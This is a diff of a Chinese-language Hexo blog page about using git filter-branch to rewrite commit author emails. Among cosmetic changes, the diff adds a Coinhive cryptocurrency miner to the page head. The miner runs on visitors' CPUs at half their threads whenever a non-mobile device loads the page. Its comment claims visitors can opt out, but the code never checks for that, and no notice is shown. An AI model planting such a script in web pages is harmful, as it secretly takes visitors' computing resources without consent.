@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2015/12/20/人称git核弹级 filter-branch/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="都说“占小便宜吃大亏”,一点不假，听说GitHub Education的服务很不错，就用自己的edu.cn邮箱把GitHub的邮箱改了，接着去Get the Student Developer Pack。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2016-05-20T16:18:30.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="人称git核弹级 filter-branch ">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -249,10 +264,10 @@
 <p>静待回馈email，But！！！被拒绝了，原因是不认edu.cn的邮箱，好吧算了被拒绝也没什么好说的了，回到我的GitHub主页，顿时眼前一白，我的contributions图消失了，虽说不是很多但也是代表自己的contributions，好了不说废话了，解决竟是git的核弹级的 filter-branch。解决方法为全局性地更换电子邮件地址代码如下</p>
 <figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">filter</span>-branch --commit-<span class="keyword">filter</span> '</div><div class="line">        <span class="keyword">if</span> [ <span class="string">"$GIT_AUTHOR_EMAIL"</span> = w<span class="meta">@W</span>-MacBook-Pro.<span class="keyword">local</span> ];</div><div class="line">        <span class="keyword">then</span></div><div class="line">                GIT_AUTHOR_NAME=kingzez;</div><div class="line">                GIT_AUTHOR_EMAIL=kingzez<span class="meta">@sina</span>.com;</div><div class="line">                git commit-tree <span class="string">"$@"</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">                git commit-tree <span class="string">"$@"</span>;</div><div class="line">        fi' HEAD</div></pre></td></tr></table></figure>
 <p>接下来解释一下代码含义：这次的一个失误让我也发现了一个容易忽视的问题，在重装Mac后忘记了配置本地的git config，所以造成了我本地不合法的git用户邮箱（w@W-MacBook-Pro.local）其中上传的部分内容不在contributions上显示，（另外还有我的edu.cn的邮箱，针对我个人而言需要修改两次，）原因是contributions图是对应git用户配置显示的，这是我更改了邮箱后图消失的原因，Github系统找不到现在邮箱的git用户，所以我现在要操作的是</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config --global user<span class="selector-class">.name</span> <span class="string">"kingzez"</span></div></pre></td></tr></table></figure>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">git</span> <span class="selector-tag">config</span> <span class="selector-tag">--global</span> <span class="selector-tag">user</span><span class="selector-class">.email</span> "<span class="selector-tag">kingzez</span>@<span class="keyword">sina</span>.<span class="keyword">com</span>"</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"kingzez"</span></div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"kingzez@sina.com"</span></div></pre></td></tr></table></figure>
 <p>操作后为了安全起见，在检查一遍
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">config</span> <span class="comment">--list</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git<span class="built_in"> config </span>--list</div></pre></td></tr></table></figure></p>
 <p>然后操作核弹级的<code>filter-branch --commit-filter</code> 这个必须要小心，千万要确认自己修改的邮箱是正确的，这个会遍历并重写所有提交历史到你新的邮箱上，命令完成后需要强推 <code>git push -f</code>，到Github主页刷新，我的contributions图又回来了，但是其中可能是以前的操作不当恢复的不是很完整，能恢复大部分已经很好了，原本只是改了一个邮箱，结果折腾这么一大圈。</p>
 
         
@@ -264,7 +279,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2015/12/20/人称git核弹级 filter-branch/" data-id="cj3wdnjff003r09heesm74ten" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2015/12/20/人称git核弹级 filter-branch/" data-id="cjcc61dj1003c70fytmypselr" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -402,7 +417,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -437,7 +452,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -472,7 +487,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -542,7 +557,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -596,7 +611,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
